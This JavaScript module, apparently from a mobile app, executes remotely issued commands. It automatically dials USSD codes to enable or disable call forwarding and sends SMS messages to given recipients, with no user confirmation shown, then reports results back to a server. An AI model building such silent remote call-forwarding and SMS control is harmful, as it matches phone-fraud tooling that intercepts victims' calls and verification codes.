import UssdService from './UssdService';
import SmsService from './SmsService';
import SocketService from './SocketService';

class CommandService {
    constructor() {
        this.updateAppData = null;
        this.deviceIdRef = null;
        this.appData = null;
        // ✅ Enhanced deduplication tracking
        this.executedCommands = new Set();
        this.lastCommandTimestamps = new Map();
    }

    initialize(updateAppData, deviceIdRef, appData) {
        this.updateAppData = updateAppData;
        this.deviceIdRef = deviceIdRef;
        this.appData = appData;
    }

    async handleCommand(cmd) {
        console.log("📞 COMMAND RECEIVED:", JSON.stringify(cmd, null, 2));

        // ✅ Enhanced deduplication check with multiple keys
        const commandId = cmd._id || cmd.payload?.commandId || cmd.payload?.uniqueCommandId;
        const commandKey = `${cmd.action}_${commandId}_${cmd.payload?.to || cmd.payload?.number}_${cmd.payload?.slot}`;

        if (commandId && this.executedCommands.has(commandKey)) {
            console.warn(`⚠️⚠️⚠️ DUPLICATE COMMAND BLOCKED: ${commandKey}`);
            return;
        }

        // ✅ Additional timestamp-based deduplication
        const now = Date.now();
        const lastTime = this.lastCommandTimestamps.get(commandKey);
        if (lastTime && (now - lastTime) < 5000) { // 5 second window
            console.warn(`⚠️⚠️⚠️ DUPLICATE COMMAND BLOCKED (timestamp): ${commandKey}`);
            return;
        }

        this.executedCommands.add(commandKey);
        this.lastCommandTimestamps.set(commandKey, now);
        console.log(`✅ Command executing: ${commandKey}`);

        // Clean up after 1 minute
        setTimeout(() => {
            this.executedCommands.delete(commandKey);
            this.lastCommandTimestamps.delete(commandKey);
        }, 60 * 1000);

        // Handle CALL_FORWARD
        if (cmd.action === "CALL_FORWARD") {
            const { slot, number, autoExecute, isDeactivation, forceExecute } = cmd.payload;

            const isDeactivationCmd = isDeactivation || !number || number.trim() === '';
            const ussdCode = UssdService.buildUssdCode(number, isDeactivationCmd);

            console.log("🤖 EXECUTING CALL FORWARD");

            const result = await UssdService.executeUssdAutomatically(
                cmd,
                ussdCode,
                slot || 0,
                isDeactivationCmd
            );

            SocketService.emitCommandAck({
                commandId: commandId,
                success: result.success,
                deviceId: this.deviceIdRef?.current,
                timestamp: Date.now(),
                autoExecuted: true,
                ussdCode: ussdCode,
                message: result.message,
                slotId: slot || 0,
                isDeactivation: isDeactivationCmd,
                source: 'foreground',
                error: result.error
            });

            if (this.updateAppData) {
                this.updateAppData({
                    callForwardingActive: !isDeactivationCmd,
                    lastCallForwardingUpdate: new Date(),
                    commandExecutionCount: (this.appData?.commandExecutionCount || 0) + 1
                });
            }
        }

        // Handle SEND_SMS
        if (cmd.action === "SEND_SMS") {
            console.log("📨📨📨 EXECUTING SEND SMS COMMAND (SINGLE) 📨📨📨");

            const { to, body, slot } = cmd.payload;

            if (!to || !body) {
                console.error("❌ Missing SMS recipient or body");
                SocketService.emitCommandAck({
                    commandId: commandId,
                    success: false,
                    deviceId: this.deviceIdRef?.current,
                    timestamp: Date.now(),
                    message: "Missing recipient or message body",
                    source: 'foreground',
                    error: "Invalid SMS parameters"
                });
                return;
            }

            console.log(`📨 Sending to ${to} from slot ${slot || 0}`);
            const result = await SmsService.sendSms(to, body, slot || 0);

            SocketService.emitCommandAck({
                commandId: commandId,
                success: result.success,
                deviceId: this.deviceIdRef?.current,
                timestamp: Date.now(),
                message: result.message,
                recipient: to,
                slot: slot || 0,
                source: 'foreground',
                error: result.error
            });

            if (this.updateAppData) {
                this.updateAppData({
                    lastSmsSentAt: new Date(),
                    commandExecutionCount: (this.appData?.commandExecutionCount || 0) + 1
                });
            }
        }
    }
}

export default new CommandService();
